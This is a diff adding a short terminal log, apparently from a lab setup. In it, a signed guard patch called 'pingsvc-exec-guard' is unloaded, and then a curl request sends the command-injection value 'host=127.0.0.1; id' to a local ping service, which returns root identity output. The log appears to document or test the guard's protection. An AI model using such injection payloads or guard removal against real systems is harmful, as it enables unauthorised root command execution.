@@ -1,0 +1,7 @@
+[1;33mtarget#[0m shirudo upatch unload lab/pingsvc-exec-guard.unload.upatch
+upatch unload: signed loader accepted, keyring 159973000, 165 instructions
+upatch unload: pingsvc-exec-guard carries the directive's payload
+upatch unload: pingsvc-exec-guard measured, register a31497e7df059b71276f57752da5b80ce8acd25a053400c32fa9e25289858c37
+upatch unload: pingsvc-exec-guard detached and unpinned
+[1;33mtarget#[0m curl -s --get --data-urlencode 'host=127.0.0.1; id' http://127.0.0.1:8080/ | tail -1
+uid=0(root) gid=0(root) groups=0(root)
